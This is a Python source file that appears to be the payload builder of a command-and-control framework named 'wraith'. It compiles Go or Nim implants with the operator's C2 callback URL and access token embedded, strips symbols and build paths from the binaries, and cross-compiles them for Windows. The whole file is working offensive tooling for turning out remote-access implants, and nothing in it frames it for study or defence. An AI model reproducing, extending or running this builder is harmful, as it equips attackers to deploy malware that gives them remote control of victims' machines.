"""Modular payload builder — compiles backends with the operator profile
hardcoded (embedded) into the binary. Type awareness: every build result is
labeled with a payload type so deliveries can be filtered before launch."""

import json
import os
import shutil
import subprocess
import tempfile

PAYLOADS_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "payloads")
DEFAULT_OUT = os.path.join(os.getcwd(), "wraith-bin")

# payload types understood by the framework (see wraith/store.py)
TYPE_FILE_POSIX = "file-posix"
TYPE_FILE_WIN = "file-win"

GO_CONFIG_SRC = """package main

// Generated by wraith build — embedded operator profile.
const (
\tembedURL   = {url}
\tembedToken = {token}
)
"""

NIM_CONFIG_SRC = """## Generated by wraith build — embedded operator profile.
const embedURL* = "{url}"
const embedToken* = "{token}"
"""

PROFILES = {
    "go": {
        "check": ["go", "version"],
        "dir": "go",
        "sources": ["main.go"],
        "build": ["go", "build", "-trimpath", "-ldflags=-s -w", "-o", "{out}", "."],
        "output": "wraith-go",
        "tags": ("ws-json-async",),
    },
    "nim": {
        "check": ["nim", "--version"],
        "dir": "nim",
        "sources": ["wraith.nim"],
        "build": ["nim", "c", "-d:release", "--opt:size", "--hints:off", "--warnings:off", "-o:{out}", "wraith.nim"],
        "output": "wraith-nim",
        "tags": ("ws-json-async",),
    },
}


def go_config_text(url, token):
    return GO_CONFIG_SRC.format(url=json.dumps(url), token=json.dumps(token))


def nim_config_text(url, token):
    return NIM_CONFIG_SRC.format(url=url.replace('"', '\\"'), token=token.replace('"', '\\"'))


def payload_type(target, goos=None):
    """Classify the artifact this build will produce."""
    if target == "go" and str(goos or "").lower() == "windows":
        return TYPE_FILE_WIN
    return TYPE_FILE_POSIX


def output_name(target, goos=None):
    name = PROFILES[target]["output"]
    if target == "go" and str(goos or "").lower() == "windows":
        return name + ".exe"
    return name


def toolchain(target):
    profile = PROFILES.get(target)
    if not profile:
        return None
    try:
        result = subprocess.run(profile["check"], capture_output=True, text=True, timeout=30)
    except (OSError, subprocess.TimeoutExpired):
        return None
    if result.returncode != 0:
        return None
    lines = (result.stdout or result.stderr).strip().splitlines()
    return lines[0] if lines else "present"


def available():
    return {target: toolchain(target) for target in sorted(PROFILES)}


def _stage_tree(target, url, token, workdir):
    """Copy the payload sources into a temp dir with an embedded config file."""
    profile = PROFILES[target]
    src_dir = os.path.join(PAYLOADS_DIR, profile["dir"])
    for name in sorted(os.listdir(src_dir)):
        if name in ("go.sum", "config_default.go", "config_embedded.go") or name.startswith("."):
            continue
        shutil.copy2(os.path.join(src_dir, name), os.path.join(workdir, name))
    if target == "go":
        shutil.copy2(os.path.join(src_dir, "go.sum"), os.path.join(workdir, "go.sum"))
        with open(os.path.join(workdir, "config_embedded.go"), "w") as f:
            f.write(go_config_text(url, token))
    else:
        with open(os.path.join(workdir, "config.nim"), "w") as f:
            f.write(nim_config_text(url, token))


def build(target, out_dir=None, url=None, token=None, goos=None, goarch=None, tags=None):
    """Compile one target with embedded config. Returns (ok, message, binary_path).

    `goos`/`goarch` are cross-compile hints for the Go backend (e.g. goos="windows").
    `tags` — protocol tags the destination listener speaks; the build refuses to
    produce an artifact whose dialect cannot match (defense at build time).
    """
    profile = PROFILES.get(target)
    if profile is None:
        return False, f"unknown target: {target} (available: {', '.join(sorted(PROFILES))})", None
    if not url or not token:
        return False, "embedded config requires url and token (run `c2 serve` first, or pass --url/--token)", None

    workdir = tempfile.mkdtemp(prefix=f"wraith-build-{target}-")
    out_dir = os.path.abspath(out_dir or DEFAULT_OUT)
    os.makedirs(out_dir, exist_ok=True)
    binary = os.path.join(out_dir, output_name(target, goos))

    env = None
    if target == "go" and (goos or goarch):
        env = dict(os.environ)
        if goos:
            env["GOOS"] = str(goos)
        if goarch:
            env["GOARCH"] = str(goarch)

    try:
        for src in profile["sources"]:
            if not os.path.isfile(os.path.join(PAYLOADS_DIR, profile["dir"], src)):
                return False, f"missing payload source: {src}", None
        version = toolchain(target)
        if version is None:
            hint = "install Go from https://go.dev/dl/" if target == "go" else \
                "install Nim from https://nim-lang.org/install.html and run: nimble install ws"
            return False, f"{target} toolchain not found — {hint}", None

        if tags:
            want = set(str(t).strip().lower() for t in tags if str(t).strip())
            have = set(profile.get("tags") or ())
            if want - have:
                return False, (f"protocol mismatch at build time: backend {target!r} speaks "
                               f"{sorted(have)} but the listener wants {sorted(want)} — "
                               f"(.wraith/builder PROFILES or a matching backend is needed)"), None

        _stage_tree(target, url, token, workdir)
        cmd = [c.format(out=binary) if "{out}" in c else c for c in profile["build"]]
        result = subprocess.run(cmd, cwd=workdir, capture_output=True, text=True, timeout=600, env=env)
    finally:
        shutil.rmtree(workdir, ignore_errors=True)

    if result.returncode != 0:
        tail = "\n".join((result.stderr or result.stdout).strip().splitlines()[-12:])
        return False, f"{target} build failed:\n{tail}", None
    return True, f"{target} payload built ({version}) → {binary}", binary
